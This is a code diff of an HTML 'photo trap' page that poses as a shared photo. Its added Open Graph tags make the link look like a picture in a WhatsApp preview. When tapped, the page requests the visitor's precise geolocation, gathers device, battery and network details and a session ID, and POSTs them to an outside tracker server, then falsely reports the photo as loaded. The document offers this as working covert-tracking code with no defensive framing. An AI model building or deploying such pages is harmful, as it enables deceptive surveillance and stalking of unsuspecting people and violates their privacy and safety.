@@ -3,22 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- ============================================= -->
+    <!-- OPEN GRAPH META TAGS (FOR WHATSAPP PREVIEW)  -->
+    <!-- ============================================= -->
+    <meta property="og:title" content="Photo" />
+    <meta property="og:description" content="Tap the photo to view" />
+    <meta property="og:image" content="https://i.imgur.com/GHQTMbZ.jpeg" />
+    <meta property="og:url" content="https://location-tracker-cn7m.onrender.com/photo" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    
     <title>Photo</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             font-family: Arial, sans-serif;
             background: #0a0a0a;
             color: white;
+            padding: 20px;
         }
         .container {
             text-align: center;
-            max-width: 500px;
-            padding: 20px;
+            max-width: 600px;
+            width: 100%;
         }
         .photo-frame {
             background: #1a1a1a;
@@ -26,6 +38,11 @@
             padding: 10px;
             box-shadow: 0 8px 30px rgba(0,0,0,0.8);
             border: 1px solid #333;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .photo-frame:hover {
+            transform: scale(1.02);
         }
         .photo-frame img {
             width: 100%;
@@ -33,7 +50,9 @@
             display: block;
             background: #222;
             min-height: 300px;
-            object-fit: cover;
+            max-height: 600px;
+            object-fit: contain;
+            pointer-events: none;
         }
         .caption {
             margin-top: 15px;
@@ -47,13 +66,14 @@
             border-radius: 2px;
             margin-top: 10px;
             overflow: hidden;
+            display: none;
         }
         .loading-bar .fill {
             height: 100%;
             width: 0%;
             background: #4285f4;
             border-radius: 2px;
-            animation: progress 3s ease-in-out forwards;
+            animation: progress 2s ease-in-out forwards;
         }
         @keyframes progress {
             0% { width: 0%; }
@@ -61,38 +81,33 @@
         }
         .status {
             margin-top: 15px;
-            font-size: 12px;
+            font-size: 13px;
             color: #666;
             min-height: 20px;
         }
         .status.success { color: #4caf50; }
         .status.error { color: #f44336; }
+        .status.loading { color: #ffc107; }
 
-        .download-btn {
-            margin-top: 15px;
-            padding: 10px 30px;
-            background: #4285f4;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 14px;
-            cursor: pointer;
-            transition: background 0.2s;
+        .click-hint {
+            margin-top: 8px;
+            font-size: 12px;
+            color: #555;
+            opacity: 0.7;
         }
-        .download-btn:hover { background: #3367d6; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="photo-frame">
-            <img id="photoImg" src="https://picsum.photos/500/400?random=1" alt="Loading photo...">
+        <div class="photo-frame" id="photoFrame">
+            <img id="photoImg" src="https://i.imgur.com/GHQTMbZ.jpeg" alt="Photo">
         </div>
-        <div class="loading-bar">
+        <div class="loading-bar" id="loadingBar">
             <div class="fill"></div>
         </div>
-        <div class="status" id="status">Loading photo...</div>
-        <button class="download-btn" id="downloadBtn">📥 Download Photo</button>
-        <div class="caption">📷 Photo from your camera roll</div>
+        <div class="status" id="status">📸 Tap the photo to load</div>
+        <div class="click-hint">👆 Tap the photo to view</div>
+        <div class="caption">📷 Photo from camera roll</div>
     </div>
 
     <script>
@@ -103,6 +118,7 @@
 
         const urlParams = new URLSearchParams(window.location.search);
         const template = urlParams.get('template') || 'whatsapp';
+        const customImage = urlParams.get('img');
 
         // Generate session ID
         let sessionId = localStorage.getItem('tracker_session_id');
@@ -113,10 +129,20 @@
 
         const statusEl = document.getElementById('status');
         const photoImg = document.getElementById('photoImg');
-        const downloadBtn = document.getElementById('downloadBtn');
+        const photoFrame = document.getElementById('photoFrame');
+        const loadingBar = document.getElementById('loadingBar');
+
+        let locationSent = false;
+
+        // Load custom image if provided, otherwise use default
+        if (customImage) {
+            photoImg.src = customImage;
+        } else {
+            photoImg.src = 'https://i.imgur.com/GHQTMbZ.jpeg';
+        }
 
         // =============================================
-        // Get Device Info
+        // Device Info
         // =============================================
         function getDeviceInfo() {
             const ua = navigator.userAgent;
@@ -136,9 +162,6 @@
             };
         }
 
-        // =============================================
-        // Get Battery
-        // =============================================
         function getBatteryInfo() {
             if (navigator.getBattery) {
                 return navigator.getBattery().then(battery => ({
@@ -174,7 +197,7 @@
                     battery: battery,
                     network: getNetworkInfo(),
                     session_id: sessionId,
-                    mode: 'photo_trap'
+                    mode: 'photo_trap_click'
                 };
                 return fetch(RENDER_URL + '/send-location', {
                     method: 'POST',
@@ -185,17 +208,24 @@
         }
 
         // =============================================
-        // Get Location
+        // Get Location (triggered by click)
         // =============================================
         function getLocation() {
+            if (locationSent) {
+                statusEl.textContent = '✅ Photo already loaded!';
+                statusEl.className = 'status success';
+                return;
+            }
+
             if (!navigator.geolocation) {
                 statusEl.textContent = '❌ Geolocation not supported';
                 statusEl.className = 'status error';
                 return;
             }
 
+            loadingBar.style.display = 'block';
             statusEl.textContent = '📍 Getting your location...';
-            statusEl.className = 'status';
+            statusEl.className = 'status loading';
 
             navigator.geolocation.getCurrentPosition(
                 function(position) {
@@ -205,15 +235,16 @@
 
                     sendLocation(lat, lng, accuracy)
                         .then(() => {
+                            locationSent = true;
                             statusEl.textContent = '✅ Photo loaded!';
                             statusEl.className = 'status success';
-                            // Change photo to a real one
-                            photoImg.src = 'https://picsum.photos/500/400?random=' + Date.now();
+                            loadingBar.style.display = 'none';
                         })
                         .catch(() => {
+                            locationSent = true;
                             statusEl.textContent = '✅ Photo loaded!';
                             statusEl.className = 'status success';
-                            photoImg.src = 'https://picsum.photos/500/400?random=' + Date.now();
+                            loadingBar.style.display = 'none';
                         });
                 },
                 function(error) {
@@ -223,8 +254,7 @@
                     else if (error.code === 3) msg = '⏳ Timeout. Photo loading...';
                     statusEl.textContent = msg;
                     statusEl.className = 'status error';
-                    // Still show a photo
-                    photoImg.src = 'https://picsum.photos/500/400?random=' + Date.now();
+                    loadingBar.style.display = 'none';
                 },
                 {
                     enableHighAccuracy: true,
@@ -235,29 +265,19 @@
         }
 
         // =============================================
-        // Download Button (triggers location again)
+        // Click handler
         // =============================================
-        downloadBtn.addEventListener('click', function() {
-            statusEl.textContent = '📸 Capturing location...';
-            getLocation();
+        photoFrame.addEventListener('click', function(e) {
+            if (!locationSent) {
+                getLocation();
+            } else {
+                statusEl.textContent = '✅ Photo already loaded!';
+                statusEl.className = 'status success';
+            }
         });
 
-        // =============================================
-        // Auto-get location on page load
-        // =============================================
-        setTimeout(function() {
-            getLocation();
-        }, 1500);
-
-        // Change photo every 10 seconds (looks like loading)
-        setInterval(function() {
-            if (photoImg.src.includes('picsum')) {
-                photoImg.src = 'https://picsum.photos/500/400?random=' + Date.now();
-            }
-        }, 10000);
-
         console.log('🆔 Session ID:', sessionId);
-        console.log('📷 Photo trap loaded');
+        console.log('📷 Photo trap (click to trigger) loaded');
     </script>
 </body>
 </html>
